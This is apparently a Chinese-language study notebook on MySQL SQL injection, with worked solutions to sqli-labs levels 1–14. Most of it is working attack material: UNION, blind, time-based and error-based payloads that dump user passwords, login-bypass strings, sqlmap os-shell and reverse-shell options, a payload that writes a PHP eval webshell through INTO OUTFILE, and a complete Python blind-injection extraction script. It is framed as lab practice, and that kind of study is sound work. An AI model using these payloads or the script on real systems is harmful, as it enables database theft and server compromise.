# 基础

## infomation_schema

在 mysql5 版本以后，有一个内置的重点的数据库叫作 **infomation_schema** ， 这个库里面有很多表，重点是这三个表 **SCHEMATA** 、**TABLES** 和 **COLUMNS**

```
SCHEMATA 表中重点的是记录着数据库名的字段 SCHEMA_NAME
TABLES   表中重点关注数据库库名 TABLES_SCHEMA 和表名的字段名 TABLE_NAME
COLUMNS  表中重点关注数据库库名 TABLE_SCHEMA、表名 TABLE_NAME、字段名 COLUMN_NAME
```

获取mysql账号的密码

```sql
select authentication_string from mysql.user limit 1;
```

```sql
select password from mysql.user limit 1;
```

## 注入点

[sql 注入注入点](https://blog.csdn.net/baidu_39504221/article/details/110283105)

本节将从SQL语句的语法角度，从不同的注入点位置讲述SQL注入的技巧

### SELECT 注入：

- SELECT语句用于数据表记录的查询，常在界面展示的过程使用，如新闻的内容、界面的展示等。
- SELECT语句的语法如下：

#### 注入点在select_expr（列表达式）：

- SELECT语法

<img src="图片\modb_20211102_2fc5554a-3bc9-11ec-a7ab-fa163eb4f6be.png" alt="img" style="zoom:80%;" />

```
此时可以采取时间盲注进行数据获取，不过根据MySQL的语法，我们有更优的方法，利用AS别名的方法，直接将查询的结果显示到界面中。
访问链接http://XXX.XXX.XXX.XXX/sqln1.php？id=（select%20pwd%20from%20wp_user）%20as%20title
```

- 数据库别名AS区别
- SQL别名

##### 自我尝试

以下的自我尝试均来自 security.users 表，如下所示

<img src="图片\Snipaste_2023-02-06_16-19-20.png" alt="Snipaste_2023-02-06_16-19-20" style="zoom:80%;" />

```
SELECT (SELECT PASSWORD FROM users LIMIT 1) AS address,username FROM users LIMIT 1;
// (SELECT PASSWORD FROM users LIMIT 1) AS address 为可控处
```

<img src="图片\Snipaste_2023-02-06_16-21-07.png" alt="Snipaste_2023-02-06_16-21-07"  />

#### 注入点在table_reference：

- `table_reference`
  关键词代表查询数据来自的一个或多个表；
- SQL基础语法 - SELECT语句

```
$res = mysqli_query($conn, "SELECT title FROM ${_GET['table']}");

SELECT title FROM (SElECT pwd AS title FROM wp_user)x;
```

- 当然，在不知表名的情况下，可以先从information_schema.tables中查询表名。在select_expr和table_reference的注入，如果注入的点有反引号包裹，那么需要先闭合反引号。读者可以在自己本地测试具体语句。

##### 自我尝试

```
SELECT id FROM (SELECT PASSWORD AS id FROM users)X;
// (SELECT PASSWORD AS id FROM users)X 为可控参数
```

<img src="图片\Snipaste_2023-02-06_16-28-11.png" alt="Snipaste_2023-02-06_16-28-11"  />

#### 注入点在WHERE或HAVING后:

```
$res = mysqli_query($conn, "SELECT title FROM wp_news WHERE id = ${_GET['id']}");
```

- 也是现实中最常遇到的情况，要先判断有无引号包裹，再闭合前面可能存在的括号，即可进行注入来获取数据。
- 注入点在HAVING后的情况与之相似。
- SQL HAVING 子句

这是最常见的地方，我们在 sqli-labs 与 ctfshow 的前面几关都是这种情况

#### 注入点在GROUP BY或ORDER BY后：

- 当遇到不是WHERE后的注入点时，先在本地的MySQL中进行尝试，看语句后面能加什么，从而判断当前可以注入的位置，进而进行针对性的注入。

```
$res = mysqli_query($conn, "SELECT title FROM wp_news WHERE GROUP BY ${_GET['title']}");

title=id desc，（if（1，sleep（1），1））会让页面迟1秒，于是可以利用时间注入获取相关数据。

防御：只要对输入的值进行白名单比对，基本上就能防御这种注入。
```

##### 自我尝试

```
SELECT username FROM users GROUP BY username=2 DESC,(IF(1,SLEEP(2),1));
// username=2 DESC,(IF(1,SLEEP(2),1)) 为可控
```

有明显延时

<img src="图片\Snipaste_2023-02-06_16-46-01.png" alt="Snipaste_2023-02-06_16-46-01" style="zoom:80%;" />

#### 注入点在LIMIT后：

```
前提：MySQL版本 < 5.6
LIMIT后的注入判断比较简单，通过更改数字大小，页面会显示更多或者更少的记录数。
由于语法限制，前面的字符注入方式不可行（LIMIT后只能是数字），在整个SQL语句没有ORDER BY关键字的情况下，可以直接使用UNION注入。

PROCEDURE analyse（（SELECT extractvalue（l, concat（ox3a, （IF（MID（VERSION（）,1,1）LIKE 5,BENCHMARK〔500000，SHA1（1）），1）））），1）
```

##### 自我尝试

`SELECT username FROM users WHERE id > 0 ORDER BY id LIMIT 【注入点】`

如果没有order by 可以尝试union注入（order by 后面不可以接 union）
第二种方法是通过加入procedure注入，**此方法仅适用于5.0.0<mysql<5.6.6的版本**

```sql
SELECT username FROM users WHERE id > 0 ORDER BY id LIMIT 0,1 procedure analyse(extractvalue(rand(),concat(0x7e,database(),0x7e)),1);
```

<img src="图片\Snipaste_2023-02-06_16-50-09.png" alt="Snipaste_2023-02-06_16-50-09" style="zoom:80%;" />

### INSERT注入：

- INSERT语句是插入数据表记录的语句，网页设计中常在添加新闻、用户注册、回复评论的地方出现。

<img src="图片\modb_20211102_2fff3e36-3bc9-11ec-a7ab-fa163eb4f6be.png" alt="img" style="zoom:80%;" />image.png

- 通常，注入位于字段名或者字段值的地方，且没有回显信息。

##### 注入点位于tbl_name：

- 如果能够通过注释符注释后续语句，则可直接插入特定数据到想要的表内，如管理员表。

```
$res = mysqli_query（$conn，"INSERT INTO {$_GET['table']} VALUES（2， 2， 2， 2）"）;

http://XXX.XXX.XXX.XXX/insert.php?table=wp_user values（2，'newadmin'，'newpass'）%23
```

- 开发者预想的是，控制table的值为wp_news，从而插入新闻表数据。

##### 注入点位于VALUES：

```
INSERT INTO wp_user VALUES〔1，1，'可控位置'）;

INSERT INTO wp_user VALUES（1, 0,1）(2,1,'aaa'）;
```

- 如果用户表的第2个字段代表的是管理员权限标识，便能插入一个管理员用户。
- 在某些情况下，我们也可以将数据插入能回显的字段，来快速获取数据。
- 假设最后一个字段的数据会被显示到页面上，那么采用如下语句注入，即可将第一个用户的密码显示出来：

```
INSERT INTO wp_user VALUES （l, 1,'1' ）,（2, 2,（SELECT pwd FROM wp_user LIMIT 1））;
```

### UPDATE注入：

- PDATE语句适用于数据库记录的更新，如用户修改自己的文章、介绍信息、更新信息等。

- UPDATE语句的语法如下：

  <img src="图片\Snipaste_2023-03-18_14-16-46.png" alt="Snipaste_2023-03-18_14-16-46" style="zoom:80%;" />

<img src="图片\Snipaste_2023-03-18_14-17-11.png" alt="Snipaste_2023-03-18_14-17-11" style="zoom:80%;" />

### DELETE注入：

```
$res = mysqli_query（$conn,"DELETE FROM wp_neWs WHERE id= {$_GET['id']")}
```

- DELETE语句的作用是删除某个表的全部或指定行的数据。
- 对id参数进行注入时，稍有不慎就会使WHERE后的值为True，导致整个wp_news的数据被删除。
- 为了保证不会对正常数据造成干扰，通常使用'and sleep（1）'的方式保证WHERE后的结果返回为False，让语句无法成功执行。

# sqlmap进阶笔记

**前提条件**
网站必须是root权限
需要知道网站的绝对路径
GPC为off，php主动转义的功能关闭
My.ini secure_file_priv=""

**文件操作**

```
–file-read #读取指定文件
–file-write #写入本地文件
–file-dest #要写入的文件绝对路径
```

**命令执行**

```
–os-cmd=whoami #执行系统命令
–os-shell #系统交互shell
```

原理：类似上传webshell到网站路径

**和msf的结合**

```
–os-pwn #反弹shell(–os-pwn --msf-path=/opt/framework/msf3/)
```

原理剖析
Sqlmap会传上去两个文件来自动上传文件，自动执行命令

**-r 从文件里的数据包注入**

```bash
python sqlmap.py -r sql.txt --dbms mysql --batch --dbs
```

注意注入点加上  *  号，以下是 `X-Forwarded-For` 头注入

```http
GET /sqqyw/ HTTP/1.1
Host: 127.0.0.1:8081
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
X-Forwarded-For:1.1.1.1*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=763ujahtj2fg6b3ktsqvttf4t0
Connection: close
```



# sqli-lab

## Less-1

题目部分源码，是**GET字符型注入**

```php
$id=$_GET['id'];
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
......
echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
```

判断注入

```
?id=1' and 1=1 --+        返回正常  
?id=1' --+                返回正常 
?id=1' and 1=2 --+        返回不正常
?id=-1' --+               返回不正常
```

判断当前表的字段

```
?id=-3' order by 6 --+
```

<img src="图片\Snipaste_2023-01-20_11-17-07.png" alt="Snipaste_2023-01-20_11-17-07" style="zoom:67%;" />

判断注入**显示数据**的位置，位置为 2 和 3

```
?id=-3' union select 1,2,3,4,5,6 --+
```

<img src="图片\Snipaste_2023-01-20_11-19-57.png" alt="Snipaste_2023-01-20_11-19-57" style="zoom:67%;" />

常规注入

```
?id=-3' union select 1,database(),user(),4,5,6 --+
```

<img src="图片\Snipaste_2023-01-20_11-23-11.png" alt="Snipaste_2023-01-20_11-23-11" style="zoom:67%;" />

已知了当前数据库为 security ，查看表名

```
?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security'),4,5,6 --+
```

<img src="图片\Snipaste_2023-01-20_11-45-33.png" alt="Snipaste_2023-01-20_11-45-33" style="zoom:67%;" />

找到我们需要的表 users ，查看它的字段名

```
?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users'),4,5,6 --+
```

<img src="图片\Snipaste_2023-01-20_11-53-43.png" alt="Snipaste_2023-01-20_11-53-43" style="zoom:67%;" />

查询 users 表中 我们需要的字段 password 的数据 

```
?id=-1' union select 1,2,(select group_concat(password) from security.users),4,5,6 --+
```

<img src="图片\Snipaste_2023-01-20_11-57-09.png" alt="Snipaste_2023-01-20_11-57-09" style="zoom:67%;" />

## Less-2

题目部分源码，**GET的整型注入**

```php
$id=$_GET['id'];

// connectivity 
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
.........
echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
```

注入的原理和 Less-1 一样，就是闭合 sql 语句时不同，我们不需要 ‘ 来闭合

```
?id=-1 union select 1,2,(select group_concat(password) from security.users),4,5,6 --+
```

拼接到 sql 语句中为，整型的话就直接闭合了

```
$sql="SELECT * FROM users WHERE id=-1 union select 1,2,(select group_concat(password) from security.users),4,5,6 --+ LIMIT 0,1";
```

<img src="图片\Snipaste_2023-01-20_12-04-58.png" alt="Snipaste_2023-01-20_12-04-58" style="zoom:67%;" />

## Less-3

题目部分源码，**括号字符型注入**

```
$id=$_GET['id'];
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
........
echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
```

整体思路与 Less-1 一样，还是闭合 sql 语句有所不同

```
?id=1') --+                 返回正常
?id=1')  and 1=1 --+        返回正常
?id=-1') --+                返回不正常
 ?id=1')  and 1=2 --+       返回不正常
```

答案

```
?id=-1')  union select 1,database(),(select group_concat(password) from security.users),4,5,6 --+
```

<img src="图片\Snipaste_2023-01-20_12-20-48.png" alt="Snipaste_2023-01-20_12-20-48" style="zoom:67%;" />

## Less-4

题目部分源码，双引号括号GET型注入

```
$id=$_GET['id'];
// connectivity 

$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
..........
echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
```

思路与 Less-1 一致 ，关键也是在闭合 sql 语句，用 ") 来闭合

```
-1")  union select 1,database(),(select group_concat(password) from security.users),4,5,6 --+
```

<img src="图片\Snipaste_2023-01-20_12-34-28.png" alt="Snipaste_2023-01-20_12-34-28" style="zoom:67%;" />

## Less-5*

题目部分源码，无回显GET单引号字符型注入

```php
$id=$_GET['id'];
.......
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
.......
echo '<font size="3" color="#FFFF00">';
	print_r(mysql_error());    //此处为报错注入
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
```

### 方法一

判断盲注，有明显的延时感觉

```
?id=1' and sleep(20) --+
```

<img src="图片\Snipaste_2023-01-20_12-44-46.png" alt="Snipaste_2023-01-20_12-44-46" style="zoom:67%;" />

```
?id=1' and if(1=1,1,0) --+   返回正常
?id=1' and if(1=2,1,0) --+   返回不正常
```

获取数据库名的长度，security 的长度是8

```
?id=1' and if(length(database())>10,sleep(20),0) --+
```

获取数据库名称，为 security

```
?id=1' and if(substr(database(),1,1)='s',sleep(10),1) --+
```

获取数据库表的数量

```
?id=1' and if((select count(*)table_name from information_schema.tables where table_schema=database())=37,1,0) --+
```

获取表名称的长度，limit 0,1 表示是第一个表，limit 1,1 表示是第二个表

```
?id=1' and if((select LENGTH(table_name) from information_schema.tables where table_schema='security' limit 0,1)=6,1,0) --+
```

获取表名称，substring() 函数为截取字符串

```
?id=1' and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1),1,1)='e',1,0) --+
```

```
SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1  
# 为查询当前数据库第一个表的名称，查询第二个的的话用 limit 1,1
```

<img src="图片\Snipaste_2023-01-20_14-01-12.png" alt="Snipaste_2023-01-20_14-01-12" style="zoom: 67%;" />

 获取表的字段数量，count() 函数返回数量

```
?id=1' and if((select count(column_name) from information_schema.columns where table_schema='security' and table_name='users')=6,1,0) --+
```

获取字段的长度，limit 0,1 是第一个字段长度

```
?id=1' and if((select length(column_name) from information_schema.columns where table_schema='security' and table_name= 'users' limit 0,1)=2,1,0) --+
```

获取表中的字段名 ，由以上得出我们需要的表名为 users，AND table_schema='security' 体现了别的库可能也有 users 表，要排除

```
?id=1'and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' AND table_schema='security' limit 0,1),1,1)='i',1,0)--+
```

```
SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 8,1;
# LIMIT 8,1 为查询 users 表中的第9个字段名，这是未排除其它库的users表的结果
```

<img src="图片\Snipaste_2023-01-20_14-17-49.png" alt="Snipaste_2023-01-20_14-17-49" style="zoom:67%;" />

获取 users 表中字段数据的数量

```
?id=1'and if ((select count(username) from users)=3,1,0) --+
```

获取字段数据的长度，limit 0,1 表示第一个字段数据的长度

```
?id=1'and if ((select length(username) from users limit 0,1)=8,1,0) --+
```

获取字段数据

```
?id=1'and if (ascii(substr((select username from users limit 0,1),1,1))=122,1,0) --+
```

payload 已经解决了，现在该写 python 脚本了

```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-


import requests
import optparse


# 存放数据库名变量
DBName = ""
# 存放数据库表变量
DBTables = []
# 存放数据库字段变量
DBColumns = []
# 存放数据字典变量,键为字段名，值为字段数据列表
DBData = {}
# 若页面返回真，则会出现You are in...........
flag = "You are in..........."

# 设置重连次数以及将连接改为短连接
# 防止因为HTTP连接数过多导致的 Max retries exceeded with url
requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False


# 盲注主函数
def StartSqli(url):
	GetDBName(url)
	print("[+]当前数据库名:{0}".format(DBName))
	GetDBTables(url,DBName)
	print("[+]数据库{0}的表如下:".format(DBName))
	for item in range(len(DBTables)):
		print("(" + str(item + 1) + ")" + DBTables[item])
	tableIndex = int(input("[*]请输入要查看表的序号:")) - 1
	GetDBColumns(url,DBName,DBTables[tableIndex])
	while True:
		print("[+]数据表{0}的字段如下:".format(DBTables[tableIndex]))
		for item in range(len(DBColumns)):
			print("(" + str(item + 1) + ")" + DBColumns[item])
		columnIndex = int(input("[*]请输入要查看字段的序号(输入0退出):"))-1
		if(columnIndex == -1):
			break
		else:
			GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])


# 获取数据库名函数
def GetDBName(url):
	# 引用全局变量DBName,用来存放网页当前使用的数据库名
	global DBName
	print("[-]开始获取数据库名长度")
	# 保存数据库名长度变量
	DBNameLen = 0
	# 用于检查数据库名长度的payload
	payload = "' and if(length(database())={0},1,0) %23"
	# 把URL和payload进行拼接得到最终的请求URL
	targetUrl = url + payload
	# 用for循环来遍历请求，得到数据库名长度
	for DBNameLen in range(1, 99):
		# 对payload中的参数进行赋值猜解
		res = conn.get(targetUrl.format(DBNameLen))
		# 判断flag是否在返回的页面中
		if flag in res.content.decode("utf-8"):
			print("[+]数据库名长度:" + str(DBNameLen))
			break
	print("[-]开始获取数据库名")
	payload = "' and if(ascii(substr(database(),{0},1))={1},1,0) %23"
	targetUrl = url + payload
	# a表示substr()函数的截取起始位置
	for a in range(1, DBNameLen+1):
		# b表示33~127位ASCII中可显示字符
		for b in range(33, 128):
			res = conn.get(targetUrl.format(a,b))
			if flag in res.content.decode("utf-8"):
				DBName += chr(b)
				print("[-]"+ DBName)
				break


#获取数据库表函数
def GetDBTables(url, dbname):
	global DBTables
	#存放数据库表数量的变量
	DBTableCount = 0
	print("[-]开始获取{0}数据库表数量:".format(dbname))
	#获取数据库表数量的payload
	payload = "' and if((select count(*)table_name from information_schema.tables where table_schema='{0}')={1},1,0) %23"
	targetUrl = url + payload
	#开始遍历获取数据库表的数量
	for DBTableCount in range(1, 99):
		res = conn.get(targetUrl.format(dbname, DBTableCount))
		if flag in res.content.decode("utf-8"):
			print("[+]{0}数据库的表数量为:{1}".format(dbname, DBTableCount))
			break
	print("[-]开始获取{0}数据库的表".format(dbname))
	# 遍历表名时临时存放表名长度变量
	tableLen = 0
	# a表示当前正在获取表的索引
	for a in range(0,DBTableCount):
		print("[-]正在获取第{0}个表名".format(a+1))
		# 先获取当前表名的长度
		for tableLen in range(1, 99):
			payload = "' and if((select LENGTH(table_name) from information_schema.tables where table_schema='{0}' limit {1},1)={2},1,0) %23"
			targetUrl = url + payload
			res = conn.get(targetUrl.format(dbname, a, tableLen))
			if flag in res.content.decode("utf-8"):
				break
		# 开始获取表名
		# 临时存放当前表名的变量
		table = ""
		# b表示当前表名猜解的位置
		for b in range(1, tableLen+1):
			payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0}' limit {1},1),{2},1))={3},1,0) %23"
			targetUrl = url + payload
			# c表示33~127位ASCII中可显示字符
			for c in range(33, 128):
				res = conn.get(targetUrl.format(dbname, a, b, c))
				if flag in res.content.decode("utf-8"):
					table += chr(c)
					print(table)
					break
		#把获取到的名加入到DBTables
		DBTables.append(table)
		#清空table，用来继续获取下一个表名
		table = ""


# 获取数据库表的字段函数
def GetDBColumns(url, dbname, dbtable):
	global DBColumns
	# 存放字段数量的变量
	DBColumnCount = 0
	print("[-]开始获取{0}数据表的字段数:".format(dbtable))
	for DBColumnCount in range(99):
		payload = "' and if((select count(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}')={2},1,0) %23"
		targetUrl = url + payload
		res = conn.get(targetUrl.format(dbname, dbtable, DBColumnCount))
		if flag in res.content.decode("utf-8"):
			print("[-]{0}数据表的字段数为:{1}".format(dbtable, DBColumnCount))
			break
	# 开始获取字段的名称
	# 保存字段名的临时变量
	column = ""
	# a表示当前获取字段的索引
	for a in range(0, DBColumnCount):
		print("[-]正在获取第{0}个字段名".format(a+1))
		# 先获取字段的长度
		for columnLen in range(99):
			payload = "' and if((select length(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1)={3},1,0) %23"
			targetUrl = url + payload
			res = conn.get(targetUrl.format(dbname, dbtable, a, columnLen))
			if flag in res.content.decode("utf-8"):
				break
		# b表示当前字段名猜解的位置
		for b in range(1, columnLen+1):
			payload = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1),{3},1))={4},1,0) %23"
			targetUrl = url + payload
			# c表示33~127位ASCII中可显示字符
			for c in range(33, 128):
				res = conn.get(targetUrl.format(dbname, dbtable, a, b, c))
				if flag in res.content.decode("utf-8"):
					column += chr(c)
					print(column)
					break
		# 把获取到的名加入到DBColumns
		DBColumns.append(column)
		#清空column，用来继续获取下一个字段名
		column = ""


# 获取表数据函数
def GetDBData(url, dbtable, dbcolumn):
	global DBData
	# 先获取字段数据数量
	DBDataCount = 0
	print("[-]开始获取{0}表{1}字段的数据数量".format(dbtable, dbcolumn))
	for DBDataCount in range(99):
		payload = "'and if ((select count({0}) from {1})={2},1,0)  %23"
		targetUrl = url + payload
		res = conn.get(targetUrl.format(dbcolumn, dbtable, DBDataCount))
		if flag in res.content.decode("utf-8"):
			print("[-]{0}表{1}字段的数据数量为:{2}".format(dbtable, dbcolumn, DBDataCount))
			break
	for a in range(0, DBDataCount):
		print("[-]正在获取{0}的第{1}个数据".format(dbcolumn, a+1))
		#先获取这个数据的长度
		dataLen = 0
		for dataLen in range(99):
			payload = "'and if ((select length({0}) from {1} limit {2},1)={3},1,0)  %23"
			targetUrl = url + payload
			res = conn.get(targetUrl.format(dbcolumn, dbtable, a, dataLen))
			if flag in res.content.decode("utf-8"):
				print("[-]第{0}个数据长度为:{1}".format(a+1, dataLen))
				break
		#临时存放数据内容变量
		data = ""
		#开始获取数据的具体内容
		#b表示当前数据内容猜解的位置
		for b in range(1, dataLen+1):
			for c in range(33, 128):
				payload = "'and if (ascii(substr((select {0} from {1} limit {2},1),{3},1))={4},1,0)  %23"
				targetUrl = url + payload
				res = conn.get(targetUrl.format(dbcolumn, dbtable, a, b, c))
				if flag in res.content.decode("utf-8"):
					data += chr(c)
					print(data)
					break
		#放到以字段名为键，值为列表的字典中存放
		DBData.setdefault(dbcolumn,[]).append(data)
		print(DBData)
		#把data清空来，继续获取下一个数据
		data = ""


if __name__ == '__main__':
	parser = optparse.OptionParser('usage: python %prog -u url \n\n'
									'Example: python %prog -u http://192.168.61.1/sql/Less-8/?id=1\n')
	# 目标URL参数-u
	parser.add_option('-u', '--url', dest='targetURL',default='http://127.0.0.1/sql/Less-8/?id=1', type='string',help='target URL')
	(options, args) = parser.parse_args()
	StartSqli(options.targetURL)
```

### 方法二

报错注入，数据库显错是指，数据库在执行时，遇到语法不对，会显示报错信息，如：

```
select' 11064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL
server version for the right syntax to use near ''' at line1
```

程序开发期间需要告诉使用者某些报错信息 方便管理员进行调试，定位文件错误。特别php 在执行SQL 语句时一般都会采用异常处理函数，捕获错误信息，在 php 中 使用 **mysql_error()** 函数。如果 SQL 注入存在时，会有报错信息返回，可以采用报错注入

```
select updatexml(1,concat(0x5e,database(),0x5e),1) 
```

<img src="图片\Snipaste_2023-01-22_10-12-46.png" alt="Snipaste_2023-01-22_10-12-46" style="zoom: 80%;" />

但是采用 updatexml 报错函数 只能显示 32 长度的内容，如果获取的内容超过 32 字符就要采用字符串截取方法。每次获取 32 个字符串的长度。 除了 updatexml 函数支持报错注入外，mysql 还有其它很多函数支持报错，如下：

 1.floor() 

```
select * from test where id=1 and (select 1 from (select count(),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a); 
```

2.extractvalue() 

```
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); 
```

3.updatexml() 

```
select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); 
```

4.geometrycollection() 

```
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b)); 
```

5.multipoint() 

```
select * from test where id=1 and multipoint((select * from(select * from(select user())a)b)); 
```

6.polygon() 

```
select * from test where id=1 and polygon((select * from(select * from(select user())a)b)); 
```

7.multipolygon() 

```
select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b)); 
```

8.linestring() 

```
select * from test where id=1 and linestring((select * from(select * from(select user())a)b)); 
```

9.multilinestring() 

```
select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b)); 
```

10.exp() 

```
select * from test where id=1 and exp(~(select * from(select user())a));
```

答案

```
?id=1' and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) --+
```

select user() 的位置可以换成其它注入语句

```
?id=1' and (updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1)) --+
```

```
?id=1' and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) --+        #可以substr函数里的1处依次加31
```

<img src="图片\Snipaste_2023-01-22_10-40-51.png" alt="Snipaste_2023-01-22_10-40-51" style="zoom:67%;" />

## Less-6

题目部分源码

```php
$id=$_GET['id'];
.........
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
.........
echo '<font size="3" color="#FFFF00">';
	print_r(mysql_error());    //此处为报错注入
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
```

与 Less-5 思路一致，就是闭合 sql 语句时换成 " 即可

```
?id=1" and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) --+
```

```
?id=1" and (updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1)) --+
```

## Less-7

https://blog.csdn.net/qq_53079406/article/details/125044475?spm=1001.2014.3001.5501

导出文件GET字符型注入，部分题目源码

```
$id=$_GET['id'];

$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

闭合 sql 时用 ')) 即可

<img src="图片\Snipaste_2023-01-22_10-53-44.png" alt="Snipaste_2023-01-22_10-53-44" style="zoom:67%;" />

mysql读文件方法，先建一个表，把文件写入表中，再查询这个表

详情 https://www.cnblogs.com/c1e4r/articles/8618692.html

```
CREATE TABLE USER(cmd TEXT);
INSERT INTO USER(cmd) VALUES (LOAD_FILE('D:\\phpstudy\\WWW\\sqli-labs\\Less-7\\result.txt'));
SELECT * FROM USER;
```

<img src="图片\Snipaste_2023-01-22_18-28-33.png" alt="Snipaste_2023-01-22_18-28-33" style="zoom: 80%;" />

sql 注入时写 shell 时条件，root 权限，配置里 secure_file_priv=""，写 shell 的目录有写入与执行权限

```
?id=-1')) union select 1,"<?php @eval($_POST['cmd']); ?>",3 into outfile "D:\\phpstudy\\WWW\\sqli-labs\\Less-7\\shell.php" --+
```

成功写入 shell

<img src="图片\Snipaste_2023-01-22_18-37-07.png" alt="Snipaste_2023-01-22_18-37-07" style="zoom:67%;" />

## Less-8~10

思路与第五关 Less-5 时一致，都是盲注，还是得先闭合 sql 语句，用 ' " ') ")) 等之类的闭合

## Less-11

题目部分源码，POST型单引号字符型注入

```php
<form action="" name="form1" method="post">
	<div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;
	    <input type="text"  name="uname" value=""/>
	</div>  
	<div> Password  : &nbsp;&nbsp;&nbsp;
		<input type="text" name="passwd" value=""/>
	</div></br>
	<div style=" margin-top:9px;margin-left:90px;">
		<input type="submit" name="submit" value="Submit" />
	</div>
</form>
........
$uname=$_POST['uname'];
	$passwd=$_POST['passwd'];
........
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);
........
else  
	{
		print_r(mysql_error());
	}
```

用万能密码 1' or 1# 就行

<img src="图片\Snipaste_2023-01-22_19-12-47.png" alt="Snipaste_2023-01-22_19-12-47" style="zoom:80%;" />

还可以使用报错注入

```
1' and updatexml(1,concat(0x5e,(select group_concat(username,0x7e,password) from users),0x5e),1)#
```

<img src="图片\Snipaste_2023-01-22_19-21-45.png" alt="Snipaste_2023-01-22_19-21-45" style="zoom:80%;" />

## Less-12

部分题目源码，双引号POST型字符型注入

```php
@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
// 其它的与 Less-11 类似
```

使用万能密码 

```
1") or 1#
```

使用报错注入

```
1") and updatexml(1,concat(0x5e,(select group_concat(username,0x7e,password) from users),0x5e),1)#
```

## Less-13

看看 sql 语句

```
@$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
```

首先还是得闭合 sql 语句，此时用 ')

```
q') or 1#
```

也可以使用报错

```
1') and multipoint((select * from(select * from(select user())a)b))#
```

```
1') and (updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1))#
```

<img src="图片\Snipaste_2023-01-22_19-56-29.png" alt="Snipaste_2023-01-22_19-56-29" style="zoom:67%;" />

也可以试试时间盲注，以下对比返回时间，我们的当前数据库为 security 长度为 8 ，以下第一个有明显的延时感觉

```
1') and multipoint((select * from(select * from(select 1 and if(length(database())>3,sleep(20),1))a)b))#
```

```
1') and multipoint((select * from(select * from(select 1 and if(length(database())>10,sleep(20),1))a)b))#
```

## Less-14

部分源码，POST单引号变形双注入,思路与上题一致，首先闭合 sql 语句，这里使用 " 闭合

```
$uname='"'.$uname.'"';
	$passwd='"'.$passwd.'"'; 
	@$sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);
```

使用万能密码登录

```
s" or 1=1#
```

使用延时注入

```
1" and multipoint((select * from(select * from(select 1 and if(length(database())>3,sleep(20),1))a)b))#
1" and multipoint((select * from(select * from(select 1 and if(length(database())>10,sleep(20),1))a)b))#
```

使用报错注入

```
1" and multipoint((select * from(select * from(select user())a)b))#
```

```
